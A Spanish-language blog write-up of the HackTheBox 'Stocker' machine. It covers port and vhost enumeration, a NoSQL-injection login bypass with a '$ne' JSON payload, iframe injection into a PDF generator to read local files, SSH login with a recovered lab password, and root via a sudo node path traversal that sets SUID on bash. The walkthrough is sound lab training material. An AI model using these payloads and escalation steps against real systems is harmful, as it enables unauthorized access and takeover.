---
layout: single
title: Stocker HackTheBox
date: 2023-03-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-stocker/icono.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - pentesting
tags:
  - Hacking web
  - pentesting
  - Linux
---
Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.

![](/assets/images/htb-writeup-stocker/Stocker.png)

Empezamos a escanear para descubrir puertos abiertos en la máquina

```bash
❯ nmap -p- --min-rate 5000 -n -vvv -Pn 10.10.11.196
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 21:37 -03
Initiating SYN Stealth Scan at 21:37
Scanning 10.10.11.196 [65535 ports]
Discovered open port 22/tcp on 10.10.11.196
Discovered open port 80/tcp on 10.10.11.196
Increasing send delay for 10.10.11.196 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.196 from 5 to 10 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 21:37, 16.48s elapsed (65535 total ports)
Nmap scan report for 10.10.11.196
Host is up, received user-set (0.18s latency).
Scanned at 2023-03-12 21:37:28 -03 for 17s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```
Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene

```bash
❯ nmap -sCV -p22,80 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 21:47 -03
Nmap scan report for 10.10.11.196
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb <--
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Vemos que nmap en el puerto 80 nos reportó un dominio, otra forma para descubrir el dominio es tirando de curl 

```bash

❯ curl -s 10.10.11.196 -I | grep Location
Location: http://stocker.htb
```
Ya que tenemos un dominio es tan solo agregarlo en el archivo /etc/hosts

```bash

127.0.0.1       localhost
127.0.1.1       voidnet
10.10.11.196 stocker.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
Revisemos la web

![](/assets/images/htb-writeup-stocker/pagina.png)

Ahora que tenemos un dominio intentemos buscar directorios ocultos con gobuster

```bash
❯ gobuster dir -u http://stocker.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://stocker.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/12 22:07:03 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
Progress: 9028 / 220561 (4.09%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/12 22:07:20 Finished
===============================================================
```
Podemos ver que nos reportó un directorio llamado fonts, veamos con qué nos encontramos

![](/assets/images/htb-writeup-stocker/direc.png)

vemos que no hay nada, intentemos buscar subdirectorios

```bash

 gobuster vhost -u http://stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
===============================================================
2023/03/12 22:15:04 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb (Status: 302) [Size: 28]
```
Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts

```bash
❯ echo '10.10.11.196 dev.stocker.htb' >> /etc/hosts

```
Ingresemos a la web

![](/assets/images/htb-writeup-stocker/pag.png)

Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con 
BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli

Al interceptar por BurpSuite nos muestra esto
```bash

POST /login HTTP/1.1

Host: dev.stocker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: http://dev.stocker.htb

Connection: close

Referer: http://dev.stocker.htb/login

Cookie: connect.sid=s%3AeehRhX_wEYQcXzjWxltuGkOJ0T8tYaa_.iO7JxTfBZdxcPOUdjeU3uGBLRc9P4jRifl0bGfz0Jx8

Upgrade-Insecure-Requests: 1


username=admin&password=admin
```
 
Ahora para hacer el ataque NoSqli tenemos que ejecutar donde está el apartado username=admin.... con este script

```bash
{"username": {"$ne": null}, "password": {"$ne": null} }

```
Pero antes donde dice content-Type tenemos que poner esto

```bash
application/json
```
Y nos quedaría algo así 

![](/assets/images/htb-writeup-stocker/burp.png)

Finalmente le damos un FORWARD

Miremos la web

![](/assets/images/htb-writeup-stocker/pagina2.png)

Al darle view cart nos muesta esto, es como si fuera una tienda y podemos agregar cosas al carrito para comprar

![](/assets/images/htb-writeup-stocker/compras.png)

 Agregamos algo al carrito y le damos View Cart nos muestra esto

![](/assets/images/htb-writeup-stocker/compras2.png)

Le damos a submit y nos muestra como un identificador y un enlace en HERE

![](/assets/images/htb-writeup-stocker/compras3.png)

Si le damos a HERE nos redirige a /api/po/ y al identificador que nos termina mostrando un pdf

![](/assets/images/htb-writeup-stocker/pdf.png)

Volvemos a interceptar con Burp y le damos submit

![](/assets/images/htb-writeup-stocker/submit.png)

Vemos una estructura en json

![](/assets/images/htb-writeup-stocker/json.png)

En el apartado title podemos modificar  y pasarle una estructura que tenga un archivo un ejemplo es el /etc/passwd

## Codigo

```bash
<iframe src=file:///etc/passwd height=750px width=750px></iframe>

```
Miramos en el repeater que a la derecha luego de ejecutar el código nos muestra una id

![](/assets/images/htb-writeup-stocker/id.png)

Copiamos ese id y lo pegamos donde está el pdf para que nos muestre el /etc/passwd

![](/assets/images/htb-writeup-stocker/pdf2.png)

Si prestamos atención al archivo podemos ver que hay un usuario que se llama angoose

Puedo pensar que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración válido

Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf 

```Bash
"<iframe src=file:///var/www/dev/index.js height=800px width=800px></iframe>"

```
Deberíamos ver el index.js en el pdf claramente

![](/assets/images/htb-writeup-stocker/burpsuite.png)

![](/assets/images/htb-writeup-stocker/id2.png)

Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobrar esa contraseña para poder conectarnos 
con ssh con el usuario angoose

Nos conectamos por ssh

```bash

❯ ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.196' (ED25519) to the list of known hosts.
angoose@10.10.11.196's password: IHeardPassphrasesArePrettySecure 
Last login: Sun Mar 12 23:53:34 2023 from 10.10.16.39
angoose@stocker:~$
```
```bash
angoose@stocker:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:d8:2d  txqueuelen 1000  (Ethernet)
        RX packets 585090  bytes 75834889 (75.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 592998  bytes 176522802 (176.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 23722  bytes 4015190 (4.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 23722  bytes 4015190 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

angoose@stocker:~$
```
Hacemos ls y ya podemos ver la primera flag

```bash

angoose@stocker:~$ ls
flag.js  user.txt
angoose@stocker:~$ cat user.txt
ca4*************************7d
angoose@stocker:~$
```

## Escala de privilegios

Si hacemos sudo -l vemos que podemos ejecutar cualquier js con node

```bash

angoose@stocker:~$ sudo -l
[sudo] password for angoose: IHeardPassphrasesArePrettySecure 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ 

```

Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hará un directory path traversal

## Codigo js

```
require('child_process').exec('chmod u+s /bin/bash')
```
Ahora ejecutamos el script de js y al hacer bash -p tendremos privilegio como root

```bash
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/setensa.js
[sudo] password for angoose: IHeardPassphrasesArePrettySecure 
angoose@stocker:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
angoose@stocker:~$ bash -p
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
26*****************************9
bash-5.0# 
```
Y obtenemos la segunda flag

Espero que les haya gustado mi primer writeup y que se haya entendido

Gracias por leer :D.
